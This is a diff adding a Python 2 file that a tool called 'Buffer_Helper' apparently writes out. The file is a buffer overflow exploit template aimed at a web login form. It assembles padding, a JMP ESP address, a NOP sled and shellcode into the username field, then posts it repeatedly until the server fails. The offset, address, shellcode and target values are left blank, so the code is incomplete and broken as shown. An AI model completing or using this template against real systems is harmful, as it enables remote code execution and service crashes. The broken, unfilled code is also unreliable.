@@ -1,0 +1,42 @@
+#!/usr/bin/env pyhton
+
+
+# this file write by Buffer_Helper
+# this file contain the the last final payload success
+# ever time you run Buffer Helper this file will get overwritten 
+
+# application name :
+
+import requests  
+
+_Offset_Byte  =  "A"*
+
+_JMP_ESP      =
+
+_NO_OPT       = "\x90"*
+
+_Shell_Code   = (
+
+
+
+_Buffer = _Offset_Byte + _JMP_ESP + _NO_OPT +  _Shell_Code
+
+Target_Url =
+
+try:
+   while True:
+         session = requests.session()
+         password = 'admin' 
+         data={ 
+         'username': '{}'.format(_Buffer),
+         'password':'{}'.format(password),
+         'user-agent':'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0'
+         }
+         response = requests.post(Target_Url ,data=data,timeout=3) 
+                                          
+except Exception :
+                            
+      print "________________Expolit Done _______________ " 
+      exit() 
+     
+     
